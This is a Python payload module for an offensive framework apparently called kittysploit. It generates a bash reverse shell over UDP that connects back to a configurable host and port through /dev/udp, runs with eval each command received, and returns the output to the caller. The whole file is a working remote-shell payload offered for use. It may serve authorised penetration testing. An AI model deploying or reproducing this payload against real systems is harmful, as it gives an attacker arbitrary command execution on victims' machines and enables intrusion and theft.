#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *


class Module(Payload):
    __info__ = {
        "name": "Bash Reverse UDP Shell",
        "description": "UDP connect-back via bash /dev/udp (KS_UDP_HELLO). Pairs with listeners/multi/reverse_udp",
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_udp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(4444, "Callback UDP port", True)

    def generate(self):
        host = str(self.lhost)
        port = int(self.lport or 4444)
        return (
            f"bash -c 'exec 3<>/dev/udp/{host}/{port}; "
            f"echo KS_UDP_HELLO >&3; "
            f"while read -r c <&3; do "
            f"[ -z \"$c\" ] && continue; "
            f"[ \"$c\" = exit ] && break; "
            f"o=$(eval \"$c\" 2>&1); "
            f"printf \"%s\\n__KS_UDP_END__\\n\" \"$o\" >&3; "
            f"done'"
        )
